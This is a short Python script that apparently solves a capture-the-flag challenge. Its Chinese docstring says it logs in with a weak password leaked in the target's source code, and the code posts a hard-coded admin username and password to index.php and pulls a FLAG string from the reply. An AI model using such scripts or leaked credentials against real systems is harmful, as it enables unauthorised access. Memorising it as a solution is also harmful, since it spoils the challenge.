import re
import requests
import sys

'''
@文件命名：X-072-24
@使用方式: python X-072-24.py url
@简述思路: 使用源码中泄露的弱口令直接登录，响应页面中匹配 flag。
'''


def Scan(url):
    r = requests.post(url + "/index.php", data={"username": "admin", "password": "sup3rsecr3t"}, timeout=5)
    return re.search(r"FLAG\{[^}]+\}", r.text).group(0)


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
